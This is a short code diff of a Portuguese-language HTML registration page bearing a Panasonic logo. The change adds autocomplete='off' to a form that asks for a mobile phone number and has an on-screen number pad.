@@ -14,10 +14,10 @@
     <body id="body-cadastro">
         <img id="img-panasonic" src="img/logo-panasonic.svg">
         <div id="container-cadastro">
-            <form id="form" action="envio-form.php" method="POST">
+            <form id="form" action="envio-form.php" method="POST" autocomplete="off">
                 <h1>valide seu cadastro</h1>
                 <p>Digite apenas números</p>
-                <input type="text" name="celular" id="inputNumber" class="celular" maxlength="15" placeholder="Celular: (DD) 91122-3344" autofocus required>
+                <input type="text" name="celular" id="inputNumber" class="celular" maxlength="15" placeholder="Celular: (DD) 91122-3344" autocomplete="off" autofocus required>
                 <button type="submit">validar</button>
             </form>
             <div id="numberpad">
